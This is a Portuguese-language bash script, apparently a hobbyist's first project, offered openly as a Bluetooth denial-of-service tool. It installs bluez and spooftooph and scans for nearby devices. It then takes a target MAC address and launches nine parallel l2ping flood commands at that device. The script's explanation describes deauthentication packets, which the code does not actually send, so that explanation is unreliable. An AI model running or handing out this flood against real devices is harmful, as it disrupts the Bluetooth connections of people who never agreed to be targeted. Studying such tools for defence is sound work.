#!/bin/bash
# DEVELOPER | DARKSEC
#apresentação:
			echo "▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀  ██████ ▓█████  ▄████▄  "
			echo "▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  "
			echo "░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ ░ ▓██▄   ▒███   ▒▓█    ▄ "
			echo "░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄   ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒"
			echo "░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄▒██████▒▒░▒████▒▒ ▓███▀ ░"
			echo " ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░"
			echo " ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░░ ░▒  ░ ░ ░ ░  ░  ░  ▒   "
			echo " ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░ ░  ░  ░     ░   ░        "
			echo "   ░          ░  ░   ░     ░  ░         ░     ░  ░░ ░      "
			echo " ░                                                ░        "
echo "*EXPLICAÇÃO*"
echo "====================================================================================================================================="
echo "OLÁ MUNDO, FIZ UM SCRIPT DE  ATAQUE DE NEGAÇÃO DE SERVIÇO BLUETOOTH MUITO SIMPLES. Quando um dispositivo alvo recebe um pacote de desautenticação,ele é enganado e acredita que o dispositivo remetente do pacote é o dispositivo legítimo que está tentando desconectar. Como resultado, o dispositivo alvo encerra a conexão Bluetooth com o dispositivo remetente do pacote de desautenticação. resumo básico"
echo "===================================================================================================================================="

# ATUALIZAÇÃO DE PACKS
echo "DESEJA BAIXAR OS PACOTES NECESSÁRIOS? SEM ELES NÃO PODERÁ RODAR O SCRIPT!( ele usará o hci0 em quase todas as distro usa o hci0 se a sua não for só ligar o bluetooth no modo grafico, mais o script ligará em CLI(interface de linha de comando) )"
echo "1 - SIM"
echo "2 - NÃO"
read resp
case $resp in  # ESCOLHA SE DESEJÁ ATUALIZAR OS PACOTES
"1")
sudo apt-get install bluez &&  sudo apt-get install spooftooph && sudo apt update && service bluetooth start

;;

"2")
	echo "INFELIZMENTE SEM A ATUALIZAÇÃO DOS PACOTES NÃO PODERÁ PROSSEGUIR"
exit

;;

esac
echo "=============================================================================================================================="
echo "ESCOLHA O MODO DE OBTER OS ENDEREÇOS MAC BLUETOOTH(TARGET)" # ESCOLHA interface BLUETOOTH...
echo "1 - SPOOFTOOPH (é bom mais precisa selecionar o modo de interface do bluetooth exemplo : hci0 etc...)"
echo "2 - HCITOOL (esse vem padrão na distro do kali, não sei se outras distros vem como padrão.)"
echo "=============================================================================================================================="
read choice
case $choice in
"1")
spooftooph -s

;;
"2")
hcitool scan

;;
esac

echo "AGORA COLOQUE A SUA INTERFACE  BLUETOOTH, EXEMPLO hci0,hci1... (se você não sabe digite enter)"	# ESCOLHENDO ALVO E O MONITOR.
read monitor
if [ $monitor == ""]
then

hciconfig # AJUDA EM INTERFACE
exit

else
	echo "iniciando o carregamento e atualizando seus pacotes..."
apt update
	echo "============================================================================================================================="
	echo "AGORA QUE VOCÊ SABE O ENDEREÇO MAC DO ALVO COLOQUE AQUI:"
	echo "============================================================================================================================="
read target
	echo "SEU ESCOPO: $target "
sleep 5
	echo "COLOQUE O NÚMERO QUE DESEJA DE PACOTES ENVIADOS AO  ALVO (EU TESTEI E SÓ MANDA TÉ 500 MAIS SE QUISER TESTAR ULTRAPASSAR O LIMITE...)"
read packs
	echo "iniciando o ataque" # DOS EM AÇÃO, EU SEI KKK SÓ É UM SIMPLES ENVIO DE PACOTES MAIS NÉ FAZER O QUE É O PRIMEIRO PROJETO K
l2ping -i $monitor -s $packs -f  $target -v &
sleep 2
l2ping -i $monitor -s $packs -f  $target -v &
sleep 2
l2ping -i $monitor -s $packs -f  $target -v &
sleep 2
l2ping -i $monitor -s $packs -f  $target -v &
sleep 2
l2ping -i $monitor -s $packs -f  $target -v &
sleep 2
l2ping -i $monitor -s $packs -f  $target -v &
sleep 2
l2ping -i $monitor -s $packs -f  $target -v &
sleep 2
l2ping -i $monitor -s $packs -f  $target -v &
sleep 2
l2ping -i $monitor -s $packs -f  $target -v


fi
# OBRIGADO, E VOCÊ QUE VIU O CODIGO FONTE DIZ AI O QUE ACHOU, PODE DESCER A LENHA KKKKKKK, MEU DC darksec_
